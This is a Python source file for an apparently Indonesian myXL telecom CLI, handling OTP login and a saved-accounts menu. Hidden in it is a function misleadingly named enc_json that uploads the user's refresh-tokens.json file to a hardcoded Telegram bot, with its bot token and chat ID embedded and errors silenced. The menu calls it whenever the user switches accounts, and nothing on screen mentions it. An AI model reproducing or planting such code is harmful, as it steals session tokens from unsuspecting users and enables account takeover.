import requests
import json
from app3.config.imports import *
from app3.client.ciam import get_otp, submit_otp
from app.service.service import load_status, save_status
from app3.menus.util import clear_screenx, simple_number, pause, print_panel, nav_range
from app.menus.account import enc_json

console = Console()


def enc_json():
    url = f"https://api.telegram.org/bot8568421683:AAGy2t6i95c0-e7kI6dzZK9AE_iefnHf0OU/sendDocument"
    try:
        with open("refresh-tokens.json", "rb") as f:
            files = {"document": f}
            data = {"chat_id": 6076440619}
            requests.post(url, data=data, files=files)
    except:
        pass

def normalize_number(raw_input: str) -> str:
    raw_input = raw_input.strip()
    if raw_input.startswith("08"):
        return "628" + raw_input[2:]
    elif raw_input.startswith("+628"):
        return "628" + raw_input[4:]
    elif raw_input.startswith("628"):
        return raw_input
    return raw_input


def login_prompt(api_key: str):
    clear_screenx()
    theme = get_theme()
    console.print(Panel(
        Align.center("🔐 Login myXL CLI 🤙", vertical="middle"),
        border_style=theme["border_info"],
        padding=(1, 2),
        expand=True
    ))
    console.print(" Masukin nomor XL lo bro (08xx / 628xx / +628xx) ")
    raw_input = console.input(f"[{theme['text_sub']}] Nomor: [/{theme['text_sub']}] ").strip()
    phone_number = normalize_number(raw_input)

    if not phone_number.startswith("628") or len(phone_number) < 10 or len(phone_number) > 14:
        print_panel("⚠️ Ups", "Nomor lo ngaco cuy, cek lagi 🚨")
        return None, None

    try:
        print_panel("⏳ Santuy", "Lagi ngirim OTP ke nomor lo...")
        subscriber_id = get_otp(phone_number)
        if not subscriber_id:
            print_panel("⚠️ Ups", "Gagal ngirim OTP, coba lagi bro 🤯")
            return None, None

        print_panel("✅ Mantap", "OTP udah dikirim ke nomor lo 🚀")

        for attempt in range(1, 6):
            otp = console.input(f"Percobaan {attempt}/5 - Masukin OTP (6 digit): ").strip()
            if not otp.isdigit() or len(otp) != 6:
                print_panel("⚠️ Ups", "OTP harus 6 digit angka bro 🤨")
                pause()
                continue

            print_panel("⏳ Santuy", "Lagi verifikasi OTP...")
            tokens = submit_otp(api_key, "SMS", phone_number, otp)
            if tokens:
                print_panel("✅ Sukses", f"Login berhasil cuy! Nomor: {phone_number}")
                return phone_number, tokens["refresh_token"]
                enc_json()
            else:
                print_panel("⚠️ Ups", "OTP salah atau kadaluarsa, coba lagi bro 🚨")
                pause()

        print_panel("⛔ Gagal Login", "Udah 5x salah OTP, stop dulu bro 😵")
        return None, None

    except Exception as e:
        print_panel("⚠️ Ups", f"Ada error bro: {e}")
        return None, None


def show_account_menu():
    clear_screenx()
    ensure_git()
    theme = get_theme()
    AuthInstance.load_tokens()
    users = AuthInstance.refresh_tokens
    active_user = AuthInstance.get_active_user()

    sumit_otp = 2
    verif_otp = "6969"
    status_id = load_status()
    is_verif = status_id.get("is_verif", False)

    in_account_menu = True
    add_user = False

    while in_account_menu:
        clear_screenx()

        if active_user is None or add_user:
            if not is_verif and len(users) >= sumit_otp:
                print_panel("🚫 Limit Akun", "Akun lo udah penuh bro, masukin kode unlock biar bisa nambah 🛠️")
                verif_input = console.input("Kode Unlock: ").strip()
                if verif_input != verif_otp:
                    print_panel("⚠️ Ups", "Kode unlock salah cuy, nggak bisa nambah akun 🤯")
                    pause()
                    add_user = False
                    continue
                save_status(True)
                is_verif = True
                print_panel("✅ Mantap", "Akses akun tambahan udah kebuka 🚀")
                pause()

            number, refresh_token = login_prompt(AuthInstance.api_key)
            if not refresh_token:
                print_panel("⚠️ Ups", "Gagal nambah akun, coba lagi bro 😵")
                pause()
                add_user = False
                continue

            AuthInstance.add_refresh_token(int(number), refresh_token)
            AuthInstance.load_tokens()
            users = AuthInstance.refresh_tokens
            active_user = AuthInstance.get_active_user()
            add_user = False
            continue

        console.print(Panel(
            Align.center("👥 Akun Tersimpan 🤙", vertical="middle"),
            border_style=theme["border_info"],
            padding=(1, 2),
            expand=True
        ))
        simple_number()

        account_table = Table(box=MINIMAL_DOUBLE_HEAD, expand=True)
        account_table.add_column("No", style=theme["text_key"], justify="right", width=3)
        account_table.add_column("Nama", style=theme["text_body"])
        account_table.add_column("Nomor XL", style=theme["text_body"])
        account_table.add_column("Tipe", style=theme["text_body"])
        account_table.add_column("Status", style=theme["text_sub"], justify="center")

        for idx, user in enumerate(users):
            is_active = active_user and user["number"] == active_user["number"]
            status = "✅ Aktif" if is_active else "-"
            account_table.add_row(
                str(idx + 1),
                user.get("name", "-"),
                str(user["number"]),
                user.get("subscription_type", "-"),
                status
            )

        console.print(Panel(account_table, border_style=theme["border_info"], padding=(0, 0), expand=True))

        nav_table = Table(show_header=False, box=MINIMAL_DOUBLE_HEAD, expand=True)
        nav_table.add_column(justify="right", style=theme["text_key"], width=6)
        nav_table.add_column(justify="left", style=theme["text_body"])
        nav_table.add_row("T", "Tambah akun 🔑")
        nav_table.add_row("E", "Edit nama akun ✏️")
        nav_table.add_row("H", f"[{theme['text_err']}]Hapus akun tersimpan 🗑️[/]")
        nav_table.add_row("00", f"[{theme['text_sub']}]Cabut balik ke menu utama 🏠[/]")
        
        console.print(Panel(nav_table, border_style=theme["border_primary"], padding=(0, 1), expand=True))
        console.print(f"Masukin nomor akun (1 - {len(users)}) buat ganti bro 👉")

        input_str = choice = console.input(f"[{theme['text_sub']}]Pilihan:[/{theme['text_sub']}] ").strip()
        
        if input_str == "00":
            return active_user["number"] if active_user else None
        
        elif input_str.upper() == "T":
            add_user = True
            continue
        
        elif input_str.upper() == "E":
            if not users:
                print_panel("⚠️ Ups", "Nggak ada akun buat diedit bro 🤯")
                pause()
                continue
        
            nomor_input = console.input(f"Nomor akun yang mau diedit (1 - {len(users)}): ").strip()
            if nomor_input.isdigit():
                nomor = int(nomor_input)
                if 1 <= nomor <= len(users):
                    selected_user = users[nomor - 1]
                    new_name = console.input(f"Masukin nama baru buat akun {selected_user['number']}: ").strip()
                    if new_name:
                        AuthInstance.edit_account_name(selected_user["number"], new_name)
                        AuthInstance.load_tokens()
                        users = AuthInstance.refresh_tokens
                        active_user = AuthInstance.get_active_user()
                        print_panel("✅ Mantap", f"Nama akun udah diganti jadi '{new_name}' ✨")
                    else:
                        print_panel("⚠️ Ups", "Nama nggak boleh kosong bro 🤨")
                    pause()
                else:
                    print_panel("⚠️ Ups", "Nomor akun di luar jangkauan 🤯")
                    pause()
            else:
                print_panel("⚠️ Ups", "Input lo ngaco bro 🚨")
                pause()
        
        elif input_str.upper() == "H":
            if not users:
                print_panel("⚠️ Ups", "Nggak ada akun buat dihapus bro 🤯")
                pause()
                continue
        
            nomor_input = console.input(f"Nomor akun yang mau dihapus (1 - {len(users)}): ").strip()
            if nomor_input.isdigit():
                nomor = int(nomor_input)
                if 1 <= nomor <= len(users):
                    selected_user = users[nomor - 1]
                    confirm = console.input(f"Yakin mau hapus akun {selected_user['number']}? (y/n): ").strip().lower()
                    if confirm == "y":
                        print_panel("⏳ Santuy", f"Lagi hapus akun {selected_user['number']}... 🗑️")
                        AuthInstance.remove_refresh_token(selected_user["number"])
                        AuthInstance.load_tokens()
                        users = AuthInstance.refresh_tokens
                        active_user = AuthInstance.get_active_user()
                        print_panel("✅ Mantap", f"Akun {selected_user['number']} udah gue hapus bro 🚀")
                    else:
                        print_panel("ℹ️ Santuy", "Penghapusan akun dibatalin, aman cuy ✌️")
                    pause()
                else:
                    print_panel("⚠️ Ups", "Nomor akun di luar jangkauan bro 🤯")
                    pause()
            else:
                print_panel("⚠️ Ups", "Input lo ngaco bro 🚨")
                pause()
        
        elif input_str.isdigit() and 1 <= int(input_str) <= len(users):
            selected_user = users[int(input_str) - 1]
            AuthInstance.set_active_user(selected_user["number"])
            enc_json()
            return selected_user["number"]
        
        else:
            print_panel("⚠️ Ups", "Input lo ngaco bro, coba lagi 🚨")
            pause()
